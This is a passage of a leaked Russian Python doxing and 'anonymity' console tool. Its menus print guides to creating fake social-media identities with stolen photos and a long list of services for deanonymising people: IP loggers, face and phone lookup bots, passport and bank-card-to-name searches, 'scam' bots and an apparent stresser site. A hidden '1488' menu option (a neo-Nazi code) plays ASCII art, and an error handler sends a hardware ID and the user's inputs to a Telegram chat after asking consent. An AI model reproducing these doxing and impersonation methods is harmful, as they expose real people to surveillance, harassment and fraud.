2. Для верификации платежных систем используйте документы, полученные через Государственный Резерв или аналогичные сервисы, избегая регистрации на родителей.

3. При переводах денежных средств рекомендуется использовать виртуальные чеки, чтобы избежать раскрытия личной информации.

4. Используйте виртуальные частные сети (VPN) для обеспечения безопасности в сети Интернет.

Список рекомендованных VPN-сервисов:

1. Mullvad - выделяется высокой анонимностью и безопасностью.

2. ProtonVPN Premium - обеспечивает тройное шифрование для максимальной защиты данных.

3. NordVPN - хороший выбор с нулевой политикой логирования и стабильным соединением.
#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
4. Бобер VPN - надежный сервис от российских специалистов, но со скоростными ограничениями.

5. CyberGhost - обеспечивает хорошее соединение, но сомнительная политика хранения логов.

Рекомендации для обеспечения анонимности в мессенджере Telegram:

1. Используйте сервис GetSMS, который не хранит логи и обеспечивает виртуальные номера.

2. При регистрации аккаунта избегайте использования номеров, связанных с метро.

3. Обязательно используйте прокси-сервера для обеспечения анонимности.

4. При покупках через мессенджер используйте виртуальные чеки и подключение через VPN.

5. В настройках Wi-Fi установите случайный MAC-адрес для дополнительной анонимности.

Рекомендации для обеспечения анонимности в социальной сети VK:

1. Приобретите виртуальный аккаунт через GetSMS, представляя фейковые данные.
#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
2. Используйте фотографии из интернета, зеркализировав их, чтобы избежать идентификации.

3. Добавляйте в друзья случайных пользователей из того же города, чтобы создать иллюзию реального проживания.

4. Избегайте предоставления реальных данных о себе.

Рекомендации для обеспечения анонимности электронной почты:

Избегайте использования почтовых сервисов, связанных с идентифицирующей информацией. Вместо этого, предпочтительнее использовать анонимные сервисы, например, Tutanota. При выборе ника не используйте свое полное имя.

Как отключить peer-to-peer в Telegram:

1. Зайдите в настройки приложения.
2. Перейдите в раздел конфиденциальности.
3. Выберите раздел звонков.#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
4. Отключите опцию "peer-to-peer".

Для обеспечения анонимности в браузере:

1. Используйте Firefox и внесите необходимые настройки конфиденциальности, чтобы скрыть отпечатки и уменьшить возможность отслеживания.
2. Включите VPN для скрытия вашего IP-адреса.
3. Обеспечьте строгие настройки приватности и удаление кукисов при закрытии браузера.
4. Предпочитайте использование англоязычной версии браузера для дополнительной анонимности. \n\n\n\nИАНУАЛ ГОВНО\n""",
                    pystyle.Colors.light_gray,
                    interval=0.005,
                )
            if choice == "53":
                pystyle.Write.Print(
                    """
Способы доксинга от Jonathan Waterson:

1. Сайт reg.ru для поиска информации.
2. Использование IP-логгера на сайте Grabify.link.
3. Еще один IP-логгер на сайте Clck.ru.
4. Бот @reverseSearch2Bot для поиска социальных сетей по фото.
5. Бот @EyeOfGod_deanonbot для получения информации по IP-адресу и лицу.
6. Бот @Smart_SearchBot также поможет найти нужную информацию.
7. Сервис FTH.SU для поиска информации по никнейму, IP-адресу или почте.
8. Сайт 220vk.com для просмотра информации о друзьях в ВКонтакте и на их страницах.
9. Findclone.ru для нахождения страниц по фотографиям.#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
11. CheckHost.net для просмотра информации по IP-адресу.
12. Программа NotePad++ для записи найденной информации.
13. Сервис phoneradar.ru, аналогичный nomer.io.
14. Программа GetContact для определения ФИО по номеру телефона.
15. Сайт archive.is для сохранения страницы.
16. VKontakte приложение для просмотра информации о странице.
17. Leakcheck для проверки паролей от почт.
18. Сервисы yzad.ru, vkdia.com, searchlikes.ru для различных поисков в соцсетях.
19. Сайт tutnaidut.com для получения информации о аккаунте за прошлые годы.
20. Flightradar24.com для базы данных о полетах.
21. VKbarkov.com для пробива страниц ВКонтакте.
22. Anonymousmask.com для взлома.
23. Бот @bagosi для ВКонтакте.
24. Archive.org и Archive.is для просмотра удаленной и сохраненной информации в интернете.
25. Сайты VAK-SMS.COM, 5sim.net, 7sim.net для виртуальных номеров.
26. Сайты vpnbook.com, vpnkeys.com, tcpvpn.com, prostovpn.org, lightvpn.pro, rootdevice.net для VPN.
27. Rulait.github.io для поиска друзей и скрытых друзей.
28. Бот @code_sms_bot для виртуальных номеров в Telegram.
29. Сайт card-number.sh для нахождения ФИО по карте.
30. Боты в Telegram для скамма и поиска информации по паспортам и номерам телефонов.
31. Сайты aleph.occrp.org, locatefamily.com, mmnt.ru, bankrot.fedresurs.ru, account.lampyre.io для разного рода поиска информации.
32. Truecaller.com для телефонной книги.
33. Бот @SafeCallsBot для анонимных звонков.
34. Боты @get_kontakt_bot, @usersbox_bot, @find_caller_bot для поиска информации о контактах.
35. Сайты fa-fa.kz, iplogger.ru, quezstresser.in для различных целей.
36. Различные боты и сайты для поиска информации в интернете по никнеймам, номерам тел#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesефонов, айпи адресам и прочему.\n""",
                    pystyle.Colors.light_gray,
                    interval=0.005,
                )
            if choice == "55":
                print()
                pystyle.Write.Print(
                    "[+] Разработчик -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    "не несет ответствености за ваши действия\n",
                    pystyle.Colors.white,
                    interval=0.005,
                )
                pystyle.Write.Print(
                    "[+] CryptoBot -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    "https://t.#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes/send?start=#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes\n",
                    pystyle.Colors.white,
                    interval=0.005,
                )
                pystyle.Write.Print(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    "[+] TGC -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    "https://t.me/lightum_tool\n", pystyle.Colors.white, interval=0.005
                )
                pystyle.Write.Print(
                    "[+] DISCORD -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    "https://discord.gg/#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes",
                    pystyle.Colors.white,
                    interval=0.005,
                )
                print()
            if choice == "56":
                print()
                pystyle.Write.Print(
                    "[+] Создатель -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    "@Lightumin\n", pystyle.Colors.white, interval=0.005
                )
                pystyle.Write.Print(
                    "[+] Вдохновители -> ", pystyle.Colors.red_to_yellow, interval=0.005#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                )
                pystyle.Write.Print("@gd23c", pystyle.Colors.red, interval=0.005)
                pystyle.Write.Print(", @Tew41k\n", pystyle.Colors.white, interval=0.005)
                pystyle.Write.Print(
                    "[+] Любимые -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    "@symvolll, ХАТА, @GroSSro, @Tew41k\n",
                    pystyle.Colors.white,
                    interval=0.005,
                )
                pystyle.Write.Print(
                    "[+] Родные -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    "@Tew41k, @symvolll, Мама, Славик воскресни 😭, Мефедрончик, Мрамор, Абсолют, Фанера, @eIikz, @depressed_chAld",
                    pystyle.Colors.white,
                    interval=0.005,
                )
                print()
            if choice == "57":
                sys.exit()
            if choice == "1488":
                if platform.system() == "Windows":
                    maximize_console_window()
                    disable_resize_and_maximize()
                    pystyle.Anime.Fade(
                        pystyle.Center.Center(
                            """MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNXK0kxdollcccccccccccloodxO0KNWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNK0Oxdollc::::;;;;;;;;;;;;;;;::::clodxkO0XNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXKOxolc:;;;;;:::::;:::;;::;;;;;::::;::::;;;;::cldkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0kdl::;;:;;::::;::;::::::::;;:;:::;;:::::::::::::::;;:cldkKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMWNKkdl::;::::;::;:::;;:::::;;;::;;::::::::::;::::::::::::::::;;::ldOKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMWN0xoc::::;;::::::::::;;;::::::;::::::::;::::::::::::::::::::::;::;::::cokKWMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMWNKko:;;::::;::;;::::::::;;::::;;;;;;;;;;;;;;;;;;;::::::;::::::::::::;;:::;;:cokXWMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMWXOoc:;:;;:::::;:::::::::::;;:clloddxkOOOOOOOOOOkkxddolc::;;;::::::::::::;:::;;:::cx0NWMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMWXkl:;;;:::::::;::;:;;:;;:cldxO0KXNWWWMMMMMMMMMMMMMMMWWWNXK0kxol::;:::;:;;:::::;::::;:coOXWMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMWKxl::;:::::::::::;::;;:coxOKNWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWXKOxoc:;;:;:::::::::::::;:oOXWMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMWXkl::;::;:::::::::;;:cox0XWMMMMMMMMMMMMMMMMMMMMMMMMMM#СЛИТО НА КАНАЛЕ t.me/Falcon_BytesMMMMMMMMMMMMMMMMWNKOdl:;::;;:::::::::::;:oONMMMMMMMMMMMMMMM
MMMMMMMMMMMMMNOl::;::::::::::::;:cokKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWN0xl:;;;::::::::::::::o0NMMMMMMMMMMMMM
MMMMMMMMMMMWKo::::::;::::::::::;:o0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWN0dc:::::::::::;::;:cxKWMMMMMMMMMMM
MMMMMMMMMMNkc:;:::::::::::::::::;:lkXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKkl:;::::::::::::::lONMMMMMMMMMM
MMMMMMMMWKd::::::::::::::::::::;::;:lkXWWWWMMMMMMMMMMMMMWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXkl:;:::::::::::::cxXWMMMMMMMM
MMMMMMMW0l::;::::::::::::::::::;::::;:cc;;dNMMMMMMMMMMMNo,,,,,,;,,,,,,,,,,,,,,,,,,;;;;;;;;;;;;;;;xNXkl:::::::::::::;:dKWMMMMMMM
MMMMMMNOc;::;::;:::::;::;;:::::::::;:::;,.lXMMMMMMMMMMMK;                                        cNMWKdc::;::;::::::::o0WMMMMMM
MMMMMNkc;:::;::;::::;:oxo:;:;;::::::::::;;ckXWMMMMMMMMMK;                                        cNMMWNOl::::::::::::::l0WMMMMM
MMMMNkc;::::::::::;;cxXWNOo:;::;::::::::;;;:lkXWMMMMMMMK;                                        cNMMMMWKd:;:::::::::;::l0WMMMM#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
MMMWOc;;:::::;:::;:lONMMMWNOo:::::::::::::;:;:lkXWMMMMMK;                                        cNMMMMMMNxc;:::;::::::;;oKWMMM
MMW0l;::::::::;:::l0WMMMMMMMKc';:::::;;::;::;:::lkXWMMMK;                                        cNMMMMMMMNkc;:;;:::::;:::dXWMM
MWXo:;::::::::::;l0WMMMMMMMMX: .';:::::::::::::;;:lkXWMK;              ..........................oWMMMMMMMMNkc;;:::::::::::xNMM
MNx:::;:::::::;;cOWMMMMMMMMMX:   .';:::::::::::::;::lkXK;             :0XXXXXXXXXXXXXXXXXXXXXXXXXNMMMMMMMMMMNx:;;:::::::::;cOWM
W0l;:::;:::::;;:kNMMMMMMMMMMX:     .';:::::::::::::;::ld,             cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXd::::::::::;;:oXM
Nx:::::;:::::;:dXMMMMMMMMMMMX:       .';:::::;::::;::::;,.            cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0l;::::;::;::;ckW
0l;;::;;:::::;c0WMMMMMMMMMMMX:         .';:::::::::::::::;,.          cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNk::::::;:::;;;oX
x:;:::::;:::::dXMMMMMMMMMMMMX:           .,:;:::::::::::;;:;,.        cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKo;:::::::;::;c0
o::;;:::::::;cOWMMMMMMMMMMMMX:            :ko:;::::::::::;:::;,'.     cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNx:;:::::::::;:x
c;::::::::::;oKWMMMMMMMMMMMMX:            ,dd:,;::::::::::::::::;,.   ,dxxxxxxxxxxxxxxxxxxxxkkkkkKWMMMMMMMMMMMMW0c;::::::::;::o
c;:::::::::;;dNMMMMMMMMMMMMMX:                 .';::::::::::::::::;,.                            lNMMMMMMMMMMMMMKo;::::::::::;l
:::;:::::::::xWMMMMMMMMMMMMMX:                   .';:::::::::::::;::;,.      #СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes                    lNMMMMMMMMMMMMMXd;:::::::;::;c
:;;:::::::::ckWMMMMMMMMMMMMMX:                     .';:::::::::::;;:::;,.                        lNMMMMMMMMMMMMMXd;::::::::::;c
:;::::::::;;ckWMMMMMMMMMMMMMX:                       .';::::::::::;:::::;,.                      lNMMMMMMMMMMMMMNd;:;:::;::;;;c
:::::;;::::::kWMMMMMMMMMMMMMX;                         .';::::::::::::::::;,.                    lNMMMMMMMMMMMMMXd;::;:::::;:;c
c;;:;;::::::;dNMMMMMMMMMMMMMX;                           .';:::;;:::::::::::;,.                  lNMMMMMMMMMMMMMKo;::;:::::::;l
c;;:;;::::::;oXMMMMMMMMMMMMMWOdddddddddddddddddddddddddc.  .';:::::::::::;::;;;,,co:.            lWMMMMMMMMMMMMW0c;;::::::::::o
o::::::::::;;cOWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK;    .';;::::::::;;::::::lkx'            lWMMMMMMMMMMMMWk:;;::;::::;::x
x:;:::::::::;:xNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK;       .';:;;::::::::::::::'            lWMMMMMMMMMMMMXo;::;:::::::;cO
0l;:;:::::;;:;l0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK;         .';;::::::::::::::;,.          lWMMMMMMMMMMMWkc;::::::::;;;oX
Nd:;;:::::;::;:dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK,           .';;:::::::::::;::;,.        lWMMMMMMMMMMWKo;;:::::::::;:kN
W0c;;:::::::::;ckNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK;             ;l:;::::;::::;::::;,.      lWMMMMMMMMMMNx:;:::;:::::;;oKM
MNx::::::::::::;l0WMMMMMMMMMMWNNNNNNNNNNNNNNNNNNNNNNNNN0,             lXOo:;::::::::::::::;,.    lWMMMMMMMMMNkc;::::::::::;cOWM
MWKo:::::::::::::oKWMMMMMMMMNo,,,,,,,,,,,,,,,,,,,,,,,,,'.             lNWNOo:;;:::::::::;:::;,.  lWMMMMMMMMWOc;:::::::::;;:dXMM
MMWOl;;:::::::::::o0WMMMMMMMX;                                        lWMMMNOo:;::::::::::::::;,'oNMMMMMMMNOc;::;:::::::;;oKWMM
MMMNkc;:::;:::::;::l0WMMMMMMX;                                        lNMMMMWNOo:;:::;;:::::::::;ckXWMMMMNkc;::;;:::::;::l0WMMM
MMMMNkc;::::;:::::::cONMMMMMX;                                        lNMMMMMMWNOo:;::::;::::::::;:lkXWWXxc;::;:::::::;;lOWMMMM
MMMMMNx:;::::::;::;::cdKWMMMX;                                        lNMMMMMMMMWNOo:;::::::::::;::;:lkOo:;:::;:::::;:;cOWMMMMM
MMMMMMNkc;:::::::::;:::lONMMX;                                        lNMMMMMMMMMMW0;';:::::::::::;:;::::;:::::::;;:::lOWMMMMMM
MMMMMMMNOl;:;::;;::::::;:d0NXo''''''''''''''''''''''''''''''''''''''''xWMMMMMMMMMMMKc,:c:;::::;:::::::::::::::::;;:::o0WMMMMMMM
MMMMMMMMW0o:;:::::::::::::cd0XNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNWMMMMMMMMMMMMWNNNXOo:;::;;:::::::::::::::::;;:dXWMMMMMMMM
MMMMMMMMMWXxc;::::::::::::;:cd0NWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN0o:::;;:::::::::::::::::ckNMMMMMMMMMM
MMMMMMMMMMMW0o::::::::::::::;;:okKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNkl::::::::::::::::;;:dKWMMMMMMMMMMM
MMMMMMMMMMMMWXkc::;::;::::::;::;:cdOXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKkoc:::::::::::::;:;:lONMMMMMMMMMMMMM
MMMMMMMMMMMMMMWKdc;;::;:::::::::::;:ldkKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0koc:;:::::::::::::;;:lkXWMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMWKdc:;;::::::::::;;::;:cldkKNWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0kdl:;;::;;;:::::::::;;:lxKWMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMWKxc:;:::::::;::;::;::::::loxk0KXNWWMMMMMMMMMMMMMMMMMMMWWNXKOkxoc:;;#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes::::;:::::::::::;;:lkKWMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMWKkl:::::;;:;::::::;;:::::;;:cloodxkkOO00000000OOOkkxdolc::;;;::::::::;::::::;::::coOXWMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMWN0dl::;;::;;:::::::::::::::::;;;;;;;:::::::::;;;;;;:::::::::::::::;;:::;::;;:lxKNWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMWXOdl:;;;::::::::::::::::::::::::::;;:::::::::::::::::::::::::::;;::::::lx0NWMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0xlc:;:::::::::::::::::::::::::;;;:::::::::::::;;::::::::::;;::cok0NWMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNKOdoc:;;::::::::::;;:::::;;::::;:::::::::::::::::::::;::coxOXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNKOkdlc:::;;::::::::::::::::::::::::::::::::;;::codk0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0Oxdolcc:::;;;;;::;::::;;;;;;::::cllodkOKXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWNXKOkxollccc:::;;::::ccclodxk0KXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"""
                        ),
                        pystyle.Colors.white_to_red,
                        pystyle.Colorate.Vertical,
                    )
                else:#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
                    pystyle.Anime.Fade(
                        pystyle.Center.Center(
                            """MMMMMMMMWNKOxdlcc::::::ccldxOKNWMMMMMMMM
MMMMMWN0xoc::;::ccllllcc::;;:cokKNWMMMMM
MMMWNOoc:;:coxO0KXXXXXXK0Oxoc:;:cd0NWMMM
MMW0o:::::o0NWMMMMMMMMMMMMWNKkoc;::dKWMM
MNkc::::::cokXMMWOlllllllllllcoxo:::lONM
Nkc;:cxko::;:o0NNc            .kXkc:;ckN
kc::cONWk,';::cdk:    .:ccccccoKMNkc:;cO
l:;:xNMMk. .,;:::,.   cNMMMMMMMMMMNx:::o
:;;l0WMMk.  .',;::;'..;dxxxxxxONMMW0l;;c#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
::;oXMMMk.     .';:;;;'.      'OMMWKo;;:
:;;oKMMM0:',,,,,,',;::;;'..   .OMMWKl;;:
c;:cOWMMWWNNNNNNK: ..';;;:;.  .OMMWkc::l
d:::oKWMWKKKKKKKO;    ;l:;:;'.'OMWKo:::x
Ko:::dXWO,.......     cKOo::;;:kNKd:::oK
W0o:;:o0k,............oNWNkc:::col:;:oKW
MWKd:::coxO00KKK0KKKKKNMMMNKkl:;;;;cxXWM
MMWNOo:;::ox0XNWWMMMMMMWWNX0xl::::oONMMM
MMMMWNOdc:;::codxkkkkkkxdoc::::cdONWMMMM#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
MMMMMMMWKOdlc::;;;;;;;;;;::clxOXWMMMMMMM
MMMMMMMMMMWXOxolc::::::clox0XWMMMMMMMMMM"""
                        ),
                        pystyle.Colors.white_to_red,
                        pystyle.Colorate.Vertical,
                    )
    except Exception as e:
        bot = telebot.TeleBot("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes:#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes")
        chat_id = -1002008365588

        def get_hwid():
            cpu_info = cpuinfo.get_cpu_info()
            mem_info = psutil.virtual_memory()
            platform_info = platform.uname()#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            hwid_data = f"{cpu_info['brand_raw']}_{mem_info.total}_{platform_info.system}_{platform_info.node}_{platform_info.release}"
            hwid = hashlib.sha256(hwid_data.encode()).hexdigest()
            return hwid

        hwid = get_hwid()
        print(f"[!] Произошла ошибка -> {e}")
        print(f"[!] Более подробно об ошибке:")#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
        traceback.print_exc()
        test = input("[?] Отправляем ошибку?(Y/N) -> ")
        if test.lower() == "y":
            tg_nickname = input("[?] Введите свой телеграм никнейм(с @) -> ")
            function = input(
                "[?] В какой функции произошла ошибка?(None если ничего) -> "
            )
            entered = input(
                "[?] Что вы вводили в параметр функции?(None если #СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesничего) -> "
            )
            osibka = oshibka()
            bot.send_message(
                chat_id,
                f"[!] {tg_nickname} отправил ошибку:\n[+] HWID -> <code>{hwid}</code>\n[+] Функция -> {function}\n[+] Параметр функции -> {entered}\n[!] Ошибка -> <code>{e}</code>",
                parse_mode="HTML",
            )
            bot.send_message(chat_id, f"[!] Ошибка -> {osibka}")
            testl = input("[?] Перезапускаем инструмент?(Y/N) -> ")
            if testl.lower() == "y":
                continue#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            else:
                sys.exit()
        else:
            testl = input("[?] Перезапускаем инструмент?(Y/N) -> ")
            if testl.lower() == "y":
                continue
            else:
                sys.exit()
